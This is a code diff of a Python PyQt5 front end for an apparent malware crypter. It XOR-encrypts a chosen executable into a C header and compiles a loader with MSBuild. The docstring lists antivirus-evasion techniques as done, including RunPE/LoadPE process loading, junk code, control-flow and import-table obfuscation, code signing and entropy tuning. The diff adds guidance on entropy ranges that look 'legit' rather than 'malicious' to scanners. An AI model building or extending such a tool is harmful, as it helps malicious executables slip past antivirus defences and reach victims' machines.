@@ -9,12 +9,11 @@
 
 """
 TODO :
-    - LoadPE (KEKW)
     - Good Section sizes
     - Random Windows API calls (help)
     
 Done :
-    - RunPE
+    - LoadPE
     - Junk code
     - Control flow
     - IAT obfuscation (adding "normal" imports in addition to the others)
@@ -23,6 +22,12 @@ Done :
     - Code signing
     - Good entropy
     - Add resources (random number of random generated bitmaps) --> Not used because it increases the entropy too much
+    
+Note about entropy :
+    Entropy: between 0 and 8
+    "Most legit" range     : [4.8; 6.8]
+    "Most malicious" range : [7.2; 8.0]
+    Best entropy : 6.4
 """
 
 from PyQt5 import QtCore, QtGui, QtWidgets
@@ -38,6 +43,7 @@ class Ui_mainWindow(object):
         self.xor = False
         self.cflow = False
         self.junk = False
+        self.filepath = ""
         self.icon_path = ""
         
     def setupUi(self, mainWindow):
@@ -79,7 +85,7 @@ class Ui_mainWindow(object):
         self.spinBox = QtWidgets.QSpinBox(self.centralwidget)
         self.spinBox.setGeometry(QtCore.QRect(155, 118, 42, 22))
         self.spinBox.setObjectName("spinBox")
-        self.spinBox.setValue(6)
+        self.spinBox.setValue(8)
         self.spinBox.setMinimum(1)
         self.label_3 = QtWidgets.QLabel(self.centralwidget)
         self.label_3.setGeometry(QtCore.QRect(120, 122, 47, 13))
@@ -90,7 +96,7 @@ class Ui_mainWindow(object):
         self.spinBox_2 = QtWidgets.QSpinBox(self.centralwidget)
         self.spinBox_2.setGeometry(QtCore.QRect(155, 138, 42, 22))
         self.spinBox_2.setObjectName("spinBox_2")
-        self.spinBox_2.setValue(2)
+        self.spinBox_2.setValue(3)
         self.spinBox_2.setMinimum(1)
         self.checkBox_3 = QtWidgets.QCheckBox(self.centralwidget)
         self.checkBox_3.setGeometry(QtCore.QRect(20, 140, 91, 16))
@@ -135,8 +141,8 @@ class Ui_mainWindow(object):
         self.checkBox_3.setText(_translate("mainWindow", "Control flow"))
     
     def generate(self) :
-        in_filename = self.pushButton.text()
-        out_filename = in_filename.split(".")[0] + "_out.exe"
+        in_filename = self.filepath
+        out_filename = self.pushButton.text().split(".")[0] + "_out.exe"
         xor_key = ''
 
         if self.xor :
@@ -151,7 +157,8 @@ class Ui_mainWindow(object):
     
         self.label_2.setText("Creating sample header...")
         QCoreApplication.processEvents()
-
+        
+        print(f"Filename : {in_filename}")
         file = bytearray(open(in_filename, 'rb').read())
         with open("sample.h", 'w') as output:
             output.write("unsigned char sample[] = { ")
@@ -171,6 +178,7 @@ class Ui_mainWindow(object):
         # Working with a copy of main.cpp
         os.rename("main.cpp", "DO_NOT_TOUCH.cpp")
         shutil.copyfile('DO_NOT_TOUCH.cpp', 'main.cpp')
+        
         with open("config.h", "w") as c :
             c.write(f'#pragma once\n#define KEY "{xor_key}"')
         
@@ -192,7 +200,7 @@ class Ui_mainWindow(object):
         
         vs_path = os.popen("\"%ProgramFiles(x86)%/Microsoft Visual Studio/Installer/vswhere.exe\" -nologo -latest -property installationPath").read().replace("\n","") #https://stackoverflow.com/questions/46223916/msbuild-exe-not-found-cmd-exe
         cmd_line = vs_path + "\\Msbuild\\Current\\Bin\\MSBuild.exe"
-
+        
         return_code = os.system("\""+cmd_line+"\" . /p:Configuration=Release;Platform=x86;OutDir=.;DebugSymbols=false;DebugType=None;Zm=5000;TargetExt=.exe;TargetName="+out_filename.replace(".exe", "")+"  /t:Rebuild")
         
         if return_code :
@@ -240,6 +248,7 @@ class Ui_mainWindow(object):
         if filePath:
             # Display the selected file path in the QLineEdit
             self.pushButton.setText(filePath.split("/")[-1:][0])
+            self.filepath = filePath
             
     
     def IconfileDialog(self):
